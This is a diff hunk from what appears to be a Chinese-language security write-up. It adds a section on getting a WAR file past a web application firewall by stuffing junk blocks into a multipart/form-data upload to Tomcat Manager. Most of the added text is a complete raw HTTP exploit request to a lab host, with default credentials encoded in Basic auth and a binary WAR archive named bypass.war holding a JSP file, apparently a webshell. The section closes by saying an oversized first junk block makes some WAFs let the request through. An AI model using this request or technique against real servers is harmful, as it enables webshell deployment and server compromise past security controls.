@@ -246,11 +246,49 @@ xxx.jsp
 
 因此需要利用`multipart/form-data`的特性,添加垃圾数据块,使WAF无法对war包进行检测,同时tomcat不对垃圾数据进行处理,顺利部署war包
 
+样例如下
 
+```
+POST /manager/html/upload;jsessionid=90151C6DAF8D510DF8E71D036D47F1F4?org.apache.catalina.filters.CSRF_NONCE=2812C24315E7A0FC3C55DB6D125DB7BC HTTP/1.1
+Host: 192.168.89.129:8080
+Content-Length: 1379
+Cache-Control: max-age=0
+Authorization: Basic dG9tY2F0OnRvbWNhdA==
+Origin: http://192.168.89.129:8080
+Upgrade-Insecure-Requests: 1
+DNT: 1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCYU5Y59MNL5BAit4
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://192.168.89.129:8080/manager/html
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: JSESSIONID=90151C6DAF8D510DF8E71D036D47F1F4
+Connection: close
 
+------WebKitFormBoundaryCYU5Y59MNL5BAit4
+Content-Disposition: form-data; name="asdf"; filename="qwer"
+Content-Type: asdfqwer
 
+aaaaaaaaaaaaaaaaaaaaaa
+------WebKitFormBoundaryCYU5Y59MNL5BAit4
+Content-Disposition: form-data; name="deployWar"; filename="bypass.war"
+Content-Type: application/x-webarchive
 
+PK��{U������������	��META-INF/���PK�����������PK��{U���������������META-INF/MANIFEST.MFMLK-.
+K-*ϳR03r.JM,IMu	X)h%&*8%�krr�PKM7D���E���PK��]T���������������bp1.jspmTOkAStdllHWlBZ1KavwMvם4TU<x{[LƓ_D1d{/ۙkr$:Q+Ǹ֙(647L/F*W̼1q!73qk3)2D2ǽe<!d{E^GMvG+.\%q4yC\K5<hD9@8w.WkKlX2|*A9/|Tmp%5jpooNvSNǷO_><ڱ*`uơ1wy7|A\Jf۬pl$]#x5I2Ac)oK"3uQ+%ɄH2^#g@(\jnƇR9 ]bB3
+L#g/WʗB-ã';oOQ"P+1'MeԲS
+UxRMRMhJ2K2
++۲,Zr6ΗI;a0D9X3v&&'d׌h_;	c+b5	k	fBñv$5T(w?<lÏo`ӡ%td%\sIc6zuh' 	klK)fGtBXLfE
+`+"`m2΢[6@spPKZV#o��d��PK���{U�����������	����������������META-INF/��PK���{UM7D���E����������������=���META-INF/MANIFEST.MFPK���]TZV#o��d������������������bp1.jspPK�������������
+------WebKitFormBoundaryCYU5Y59MNL5BAit4--
+```
 
+当第一个垃圾数据块的长度超过WAF的处理能力时,部分的WAF会直接放行
+
+![](https://img.mi3aka.eu.org/2022/08/e2c35ee5125a18195d99c3d81120f007.png)
+
+![](https://img.mi3aka.eu.org/2022/08/877c0f42eda5391de3adcd6b954deeb9.png)
 
 
 
